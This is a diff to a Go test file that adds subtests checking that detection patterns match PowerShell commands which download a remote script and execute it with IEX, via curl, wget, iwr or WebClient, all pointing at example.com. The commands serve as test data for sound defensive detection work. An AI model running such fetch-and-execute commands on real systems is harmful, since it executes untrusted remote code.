@@ -373,6 +373,13 @@ func TestCurlExecutionPatterns(t *testing.T) {
 		}
 	})
 
+	t.Run("detects powershell curl-alias eval form", func(t *testing.T) {
+		line := "powershell -NoProfile -Command \"IEX (curl https://example.com/bootstrap.ps1 -UseBasicParsing)\""
+		if !powerShellRemoteEvalPattern.MatchString(line) {
+			t.Fatalf("expected powerShellRemoteEvalPattern to match %q", line)
+		}
+	})
+
 	t.Run("detects powershell webclient downloadstring eval form", func(t *testing.T) {
 		line := "powershell -NoProfile -Command \"IEX ((New-Object Net.WebClient).DownloadString('https://example.com/bootstrap.ps1'))\""
 		if !powerShellRemoteEvalPattern.MatchString(line) {
@@ -382,6 +389,13 @@ func TestCurlExecutionPatterns(t *testing.T) {
 
 	t.Run("detects powershell fetch-then-eval form", func(t *testing.T) {
 		line := "powershell -NoProfile -Command \"$s=(iwr https://example.com/bootstrap.ps1 -UseBasicParsing); iex $s\""
+		if !powerShellFetchEvalPattern.MatchString(line) {
+			t.Fatalf("expected powerShellFetchEvalPattern to match %q", line)
+		}
+	})
+
+	t.Run("detects powershell curl-alias fetch-then-eval form", func(t *testing.T) {
+		line := "powershell -NoProfile -Command \"$s=(wget https://example.com/bootstrap.ps1 -UseBasicParsing); iex $s\""
 		if !powerShellFetchEvalPattern.MatchString(line) {
 			t.Fatalf("expected powerShellFetchEvalPattern to match %q", line)
 		}
